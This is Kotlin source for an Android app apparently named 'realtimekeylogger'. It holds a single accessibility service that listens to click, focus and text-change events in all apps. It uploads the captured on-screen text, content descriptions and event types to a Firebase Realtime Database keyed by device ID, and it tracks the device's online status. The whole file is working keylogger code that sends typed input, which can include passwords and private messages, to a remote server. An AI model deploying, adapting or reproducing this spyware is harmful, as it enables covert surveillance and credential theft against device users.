package com.shubhamgupta16.realtimekeylogger.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import com.google.firebase.database.*
import com.shubhamgupta16.realtimekeylogger.utils.getDeviceId
import com.shubhamgupta16.realtimekeylogger.utils.getDeviceName

class StrokeService : AccessibilityService() {

    val rtdb = FirebaseDatabase.getInstance().reference
    private var deviceKey: String = ""


    override fun onServiceConnected() {
        super.onServiceConnected()

        deviceKey = applicationContext.getDeviceId()

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 400
        info.packageNames = null
        serviceInfo = info


//        initialization
        val map: MutableMap<String, Any> = HashMap()
        map["name"] = getDeviceName()
        map["status"] = 1
        map["lastOnline"] = ServerValue.TIMESTAMP
        rtdb.child("devices").child(deviceKey).updateChildren(map)
        rtdb.child(".info/connected").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                Log.d("connection", snapshot.toString())
                val value = snapshot.getValue(Boolean::class.java)!!
                if (value) {
                    rtdb.child("devices").child(deviceKey).child("lastOnline")
                        .setValue(ServerValue.TIMESTAMP)
                    rtdb.child("devices").child(deviceKey).child("status").setValue(1)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
        rtdb.child("devices").child(deviceKey).child("lastOnline").onDisconnect()
            .setValue(ServerValue.TIMESTAMP)
        rtdb.child("devices").child(deviceKey).child("status").onDisconnect()
            .setValue(0)

        Toast.makeText(applicationContext, "Started", Toast.LENGTH_SHORT).show()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.text.isNotEmpty() || event.contentDescription != null) {
            if (event.eventType.let {
                    it == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                            it == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                            it == AccessibilityEvent.TYPE_VIEW_CLICKED
                }) {
                val text = event.text.joinToString { it }.ifBlank { null }
                sendEvent(
                    event.eventType, text, event.contentDescription
                )
            }
        }
    }

    private var lastEventText = ""
    private var lastEventTimeStamp = 0L
    private var lastCurrentTime = 0L
    private fun sendEvent(event: Int, text: String?, desc: CharSequence?) {
        val currentTime = System.currentTimeMillis()
        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
            if (text == null) lastEventTimeStamp = currentTime
        if (text != null) {
            if (!text.contains(lastEventText) && !lastEventText.contains(text))
                lastEventTimeStamp = currentTime
            if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
            if (text.length > 3 && lastEventText.length > 3)
                if (text.substring(3) == lastEventText.substring(3))
                    lastEventTimeStamp = currentTime
            lastCurrentTime = currentTime
            lastEventText = text
        }
        rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(
            mapOf(
                "text" to text,
                "desc" to desc,
                "event" to event
            )
        )
    }

    override fun onInterrupt() {
        Log.d("TAG", "onInterrupt: called")
    }
}